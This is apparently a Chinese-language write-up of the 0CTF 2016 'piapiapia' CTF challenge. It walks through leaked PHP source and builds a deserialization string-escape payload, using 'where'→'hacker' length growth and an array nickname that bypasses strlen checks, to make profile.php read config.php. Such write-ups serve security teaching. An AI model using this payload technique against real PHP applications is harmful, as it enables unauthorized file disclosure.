---
title: 0CTF 2016 piapiapia
categories: 赛题wp
---
# 我也太菜了吧
- 考点：反序列化字符串逃逸

源码泄露：www.zip 

config.php:
```php
<?php
	$config['hostname'] = '127.0.0.1';
	$config['username'] = 'root';
	$config['password'] = '';
	$config['database'] = '';
	$flag = '';
?>
```

发现 flag

<!--more-->

index.php:

```php
<?php
	require_once('class.php');
	if($_SESSION['username']) {
		header('Location: profile.php');
		exit;
	}
	if($_POST['username'] && $_POST['password']) {
		$username = $_POST['username'];
		$password = $_POST['password'];

		if(strlen($username) < 3 or strlen($username) > 16) 
			die('Invalid user name');

		if(strlen($password) < 3 or strlen($password) > 16) 
			die('Invalid password');

		if($user->login($username, $password)) {
			$_SESSION['username'] = $username;
			header('Location: profile.php');
			exit;	
		}
		else {
			die('Invalid user name or password');
		}
	}
	else {
?>
```
就是一个检测长度

register.php也是经检测长度

profile.php
```php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	$username = $_SESSION['username'];
	$profile=$user->show_profile($username);
	if($profile  == null) {
		header('Location: update.php');
	}
	else {
		$profile = unserialize($profile);
		$phone = $profile['phone'];
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo']));
?>
```
发现 `file_get_contents` 并有一个反序列化操作，所以应该要对 `profile数组`进行操作，如果让 `$profile['photo']` 为config.php，那么就会得到base64过后的flag




update.php
```php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {

		$username = $_SESSION['username'];
		if(!preg_match('/^\d{11}$/', $_POST['phone']))
			die('Invalid phone');

		if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
			die('Invalid email');
		
		if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
			die('Invalid nickname');

		$file = $_FILES['photo'];
		if($file['size'] < 5 or $file['size'] > 1000000)
			die('Photo size error');

		move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
		$profile['phone'] = $_POST['phone'];
		$profile['email'] = $_POST['email'];
		$profile['nickname'] = $_POST['nickname'];
		$profile['photo'] = 'upload/' . md5($file['name']);

		$user->update_profile($username, serialize($profile));
		echo 'Update Profile Success!<a href="profile.php">Your Profile</a>';
	}
	else {
?>
```

注册信息存放在`$profile数组`中，且都存在过滤

然后这个$profile数组会被序列化传到update_profile这个方法下序列化处理，

然后跳转到profile.php页面进行查看。

去看看update_profile这个方法所在的class.php:

```php
public function update_profile($username, $new_profile) {
		$username = parent::filter($username);
		$new_profile = parent::filter($new_profile);

		$where = "username = '$username'";
		return parent::update($this->table, 'profile', $new_profile, $where);
	}
```

发现先经过父类中filter方法进行过滤处理后才进行了更新操作(PHP5中使用`parent::`来引用父类方法)

查看filter方法：

```php
public function filter($string) {
		$escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';
		$string = preg_replace($escape, '_', $string);

		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);
	}
```

一个 `preg_replace` ，将 safe 中替换为 hacker ，其中之一考点出现，`反序列化字符串逃逸`

所以总体思路为：
>利用 filter 方法中的 pre_replace 函数，将 where(5长度) 替换成 hacker(6长度)，然后在 nickname 处进行反序列化字符串逃逸，令 profile[photo]=config.php 这样就包含了这个文件了

但是在nickname处会发现：

```php
if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
			die('Invalid nickname');
```

长度不能超过10，第二个考点出现：
```
md5(Array()) = null
sha1(Array()) = null
ereg(pattern,Array()) =null
preg_match(pattern,Array()) = false  
strcmp(Array(), “abc”) =null
strpos(Array(),“abc”) = null
strlen(Array()) = null		//本题用到这个特性
```

利用NULL绕过

构造：
```
<?php

$profile['phone'] = '13588888888';
$profile['email'] = '123123123@qq.com';
$profile['nickname'][] = "name";   //数组形式！！
$profile['photo'] = 'upload/' . md5('aaa');

echo serialize($profile);
?>
```
输出：
>a:4:{s:5:"phone";s:11:"13588888888";s:5:"email";s:16:"123123123@qq.com";s:8:"nickname";a:1:{i:0;s:4:"name";}s:5:"photo";s:39:"upload/47bce5c74f589f4867dbd57e9ca9f808";}

反序列化结果：
```
Array
(
    [phone] => 13588888888
    [email] => 123123123@qq.com
    [nickname] => Array
        (
            [0] => name
        )

    [photo] => upload/47bce5c74f589f4867dbd57e9ca9f808
)
```

---
```
<?php

$profile['phone'] = '13588888888';
$profile['email'] = '123123123@qq.com';
$profile['nickname'][] = "name";   //数组形式！！
$profile['photo'] = 'config.php';

echo serialize($profile);
?>
```
输出：
>a:4:{s:5:"phone";s:11:"13588888888";s:5:"email";s:16:"123123123@qq.com";s:8:"nickname";a:1:{i:0;s:4:"name";}s:5:"photo";s:10:"config.php";}

反序列化结果：
```
Array
(
    [phone] => 13588888888
    [email] => 123123123@qq.com
    [nickname] => Array
        (
            [0] => name
        )

    [photo] => config.php
)
```

所以要将 `";}s:5:"photo";s:10:"config.php";}` (34个长度)添加到name后面

payload：

```
<?php

$profile['phone'] = '13588888888';
$profile['email'] = '123123123@qq.com';
$profile['nickname'][] = 'name";}s:5:"photo";s:10:"config.php";}';
$profile['photo'] = '123';

echo serialize($profile);
?>
```

输出：
>a:4:{s:5:"phone";s:11:"13588888888";s:5:"email";s:16:"123123123@qq.com";s:8:"nickname";a:1:{i:0;s:38:"name";}s:5:"photo";s:10:"config.php";}";}s:5:"photo";s:3:"123";}

这里要是直接反序列化肯定不对，因为在这里：`s:38:“name”` ，你明明告诉我这里有38个长度，你怎么就给我4个长度呀，所以就会继续把构造的payload接着收集，直到38个长度：

```
Array
(
    [phone] => 13588888888
    [email] => 123123123@qq.com
    [nickname] => Array
        (
            [0] => name";}s:5:"photo";s:10:"config.php";}
        )

    [photo] => 123
)
```

那怎么多出来34个长度？

利用 `preg_replace`，将where传入后被替换为hacker，每一个where都会多出一个长度，所以 `34个where+payload经过替换后，payload就会生效`

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021050302151655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzUzMjYzNzg5,size_16,color_FFFFFF,t_70)

或者可以手动在序列化字符串后加34个长度？(不知道行不行，但是这道题不行)
>a:4:{s:5:"phone";s:11:"13588888888";s:5:"email";s:16:"123123123@qq.com";s:8:"nickname";a:1:{i:0;s:38:"name1111111111111111111111111111111111";}s:5:"photo";s:10:"config.php";}";}s:5:"photo";s:3:"123";}

输出：
```
Array
(
    [phone] => 13588888888
    [email] => 123123123@qq.com
    [nickname] => Array
        (
            [0] => name1111111111111111111111111111111111
        )

    [photo] => config.php
)
```
